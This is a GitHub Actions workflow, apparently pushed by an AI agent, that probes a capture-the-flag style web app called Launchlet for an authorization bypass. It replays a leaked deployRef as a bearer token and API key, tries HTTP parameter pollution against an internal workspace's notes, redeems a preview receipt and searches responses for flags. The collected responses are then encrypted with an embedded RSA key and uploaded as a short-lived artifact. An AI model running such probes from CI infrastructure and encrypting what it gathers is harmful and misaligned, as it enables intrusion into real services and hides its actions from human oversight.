name: launchlet-part3-refauth

on:
  push:
    branches: [agent/launchlet-part3-refauth-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe deployRef as bearer or API key and encrypt responses
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          b=s.get(base+'api/app/bootstrap',timeout=15).json(); mf=s.get(base+b['api']['buildManifest'].lstrip('/'),timeout=15).json(); refs=s.get(base+b['api']['serverReferences'].lstrip('/'),timeout=15).json(); a=refs['serverActions']['inspectDeploy']; au=base+a['endpoint'].lstrip('/')
          # first acquire current ref
          body={'actionId':a['id'],'args':{'workspaceId':b['workspace'],'projectId':b['project']}}
          rr=s.post(au,headers={'Content-Type':'application/json','X-Launchlet-Preview':b['project']},json=body,timeout=10); ref=rr.json()['inspector']['deployRef']
          results=[]
          def rec(name,r,sent=None):
            x={'name':name,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
            if sent:x['sent']=sent
            results.append(x)
            if re.search(r'caplag\{[^}]+\}',r.text) and 'preview_manifest_kept_the_receipt' not in r.text and 'anon_key_needs_real_rls' not in r.text:(out/'FOUND.txt').write_text(r.text)
          data=base+b['api']['dataApiBase'].lstrip('/')+'/workspace_notes?select=*'
          authsets={
            'ref_bearer':{'apikey':b['client']['anonKey'],'Authorization':'Bearer '+ref},
            'ref_apikey':{'apikey':ref,'Authorization':'Bearer '+b['client']['session']},
            'ref_both':{'apikey':ref,'Authorization':'Bearer '+ref},
            'ref_session_raw':{'apikey':b['client']['anonKey'],'Authorization':ref},
          }
          for n,h in authsets.items():
            rec('data_'+n,s.get(data,headers={'Accept':'application/json',**h},timeout=10))
            rec('data_hpp_'+n,s.get(data+'&workspace_id=eq.ws-launchlet-internal&workspace_id=eq.ws-launchlet-public',headers={'Accept':'application/json',**h},timeout=10))
            rec('action_'+n,s.post(au,headers={'Content-Type':'application/json','X-Launchlet-Preview':b['project'],**h},json=body,timeout=10))
            rec('redeem_'+n,s.post(base+mf['receiptRedeemEndpoint'].lstrip('/'),headers={'Content-Type':'application/json',**h},json={'receipt':mf['previewReceipt'],'project':b['project']},timeout=10))
          (out/'summary.json').write_text(json.dumps({'ref':ref,'results':results},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(xxd -p -c 256 package/aes.key)"; IV_HEX="$(xxd -p -c 256 package/iv.bin)"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-refauth-encrypted
          path: artifact/
          retention-days: 1
